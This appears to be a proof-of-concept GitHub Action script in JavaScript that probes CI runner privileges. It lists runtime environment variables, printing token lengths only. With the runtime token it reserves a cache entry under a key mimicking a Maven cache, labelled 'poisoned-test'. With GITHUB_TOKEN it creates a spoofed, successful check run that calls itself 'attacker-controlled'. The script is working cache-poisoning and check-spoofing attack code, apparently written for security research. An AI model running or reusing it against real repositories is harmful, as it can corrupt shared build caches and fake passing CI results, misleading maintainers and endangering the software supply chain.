const http = require('http');
const https = require('https');

async function run() {
  // Check all environment variables related to cache/runtime
  const envVars = [
    'ACTIONS_CACHE_URL', 'ACTIONS_RUNTIME_URL', 'ACTIONS_RUNTIME_TOKEN',
    'ACTIONS_ID_TOKEN_REQUEST_URL', 'ACTIONS_ID_TOKEN_REQUEST_TOKEN',
    'ACTIONS_RESULTS_URL', 'GITHUB_TOKEN', 'GITHUB_REPOSITORY'
  ];
  
  console.log('=== Environment Variables ===');
  for (const v of envVars) {
    const val = process.env[v];
    if (v.includes('TOKEN') && val) {
      console.log(`${v}: [SET, length=${val.length}]`);
    } else {
      console.log(`${v}: ${val || 'NOT SET'}`);
    }
  }

  // Try to read the runner's internal state
  const stateFile = process.env['GITHUB_STATE'];
  const envFile = process.env['GITHUB_ENV'];
  console.log(`\nGITHUB_STATE: ${stateFile}`);
  console.log(`GITHUB_ENV: ${envFile}`);

  const cacheUrl = process.env['ACTIONS_CACHE_URL'];
  const runtimeToken = process.env['ACTIONS_RUNTIME_TOKEN'];
  const runtimeUrl = process.env['ACTIONS_RUNTIME_URL'];

  if (cacheUrl && runtimeToken) {
    console.log('\n=== Cache service IS available ===');
    console.log(`Cache URL: ${cacheUrl}`);
    
    // Try to reserve a cache entry with an arbitrary key
    const reservePayload = JSON.stringify({
      key: 'Linux-maven-Maven Central Release-poisoned-test',
      version: 'deadbeef123456'
    });

    const url = new URL(`${cacheUrl}_apis/artifactcache/caches`);
    const options = {
      hostname: url.hostname,
      port: url.port,
      path: url.pathname,
      method: 'POST',
      headers: {
        'Authorization': `Bearer ${runtimeToken}`,
        'Content-Type': 'application/json',
        'Content-Length': reservePayload.length
      }
    };

    const result = await new Promise((resolve, reject) => {
      const req = (url.protocol === 'https:' ? https : http).request(options, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve({ status: res.statusCode, body: data }));
      });
      req.on('error', reject);
      req.write(reservePayload);
      req.end();
    });

    console.log(`\n=== Cache Reserve Response ===`);
    console.log(`Status: ${result.status}`);
    console.log(`Body: ${result.body}`);

    if (result.status === 201 || result.status === 200) {
      const parsed = JSON.parse(result.body);
      console.log(`\nCache ID: ${parsed.cacheId}`);
      console.log('SUCCESS: Arbitrary cache key reservation works!');
      
      // Try a query too
      const queryUrl = new URL(`${cacheUrl}_apis/artifactcache/cache?keys=Linux-maven&version=deadbeef123456`);
      const qResult = await new Promise((resolve, reject) => {
        const req = (queryUrl.protocol === 'https:' ? https : http).get(queryUrl.href, {
          headers: { 'Authorization': `Bearer ${runtimeToken}` }
        }, (res) => {
          let data = '';
          res.on('data', chunk => data += chunk);
          res.on('end', () => resolve({ status: res.statusCode, body: data }));
        });
        req.on('error', reject);
      });
      console.log(`\nCache Query Status: ${qResult.status}`);
      console.log(`Cache Query Body: ${qResult.body}`);
    } else if (result.status === 403) {
      console.log('BLOCKED: Cache write is read-only (untrusted trigger mitigation)');
    }
  } else {
    console.log('\n=== Cache service NOT available in env ===');
    console.log('Checking ACTIONS_RESULTS_URL as alternative...');
    const resultsUrl = process.env['ACTIONS_RESULTS_URL'];
    if (resultsUrl) {
      console.log(`ACTIONS_RESULTS_URL: ${resultsUrl}`);
    }
  }

  // Also test: can we create a check run from within the action?
  const token = process.env['GITHUB_TOKEN'];
  const repo = process.env['GITHUB_REPOSITORY'];
  const sha = process.env['GITHUB_SHA'];
  
  if (token && repo && sha) {
    console.log('\n=== Testing check run creation from JS action ===');
    const checkPayload = JSON.stringify({
      name: 'JS-Action-Spoofed-Check',
      head_sha: sha,
      status: 'completed',
      conclusion: 'success',
      output: {
        title: 'Spoofed from JS action',
        summary: 'Created by attacker-controlled JavaScript action'
      }
    });

    const checkResult = await new Promise((resolve, reject) => {
      const req = https.request({
        hostname: 'api.github.com',
        path: `/repos/${repo}/check-runs`,
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${token}`,
          'Accept': 'application/vnd.github+json',
          'Content-Type': 'application/json',
          'Content-Length': checkPayload.length,
          'User-Agent': 'cache-test-action'
        }
      }, (res) => {
        let data = '';
        res.on('data', chunk => data += chunk);
        res.on('end', () => resolve({ status: res.statusCode, body: data }));
      });
      req.on('error', reject);
      req.write(checkPayload);
      req.end();
    });

    console.log(`Check run creation status: ${checkResult.status}`);
    if (checkResult.status === 201) {
      const parsed = JSON.parse(checkResult.body);
      console.log(`Check run ID: ${parsed.id}`);
      console.log(`App: ${parsed.app?.slug}`);
      console.log('SUCCESS: Check run created from JS action context');
    } else {
      console.log(`Response: ${checkResult.body.substring(0, 200)}`);
    }
  }
}

run().catch(err => {
  console.error('Error:', err);
  process.exit(1);
});
